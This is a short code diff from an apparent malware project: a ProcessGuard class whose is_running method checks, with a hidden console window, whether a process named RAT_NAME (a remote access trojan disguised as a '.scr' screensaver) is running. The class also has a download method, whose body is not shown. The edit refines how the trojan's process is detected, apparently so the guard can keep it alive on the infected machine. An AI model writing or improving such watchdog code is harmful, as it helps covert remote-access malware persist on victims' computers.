@@ -154,9 +154,9 @@ class ProcessGuard:
     def is_running(self):
         try:
             cf = subprocess.CREATE_NO_WINDOW if hasattr(subprocess,'CREATE_NO_WINDOW') else 0
-            r = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {RAT_NAME}" /NH',
-                shell=True, text=True, timeout=8, creationflags=cf)
-            return RAT_NAME.lower() in r.lower()
+            r = subprocess.check_output('tasklist /NH', shell=True, text=True, timeout=8, creationflags=cf)
+            base = RAT_NAME.replace('.scr', '').lower()
+            return base in r.lower()
         except: return False
 
     def download(self):
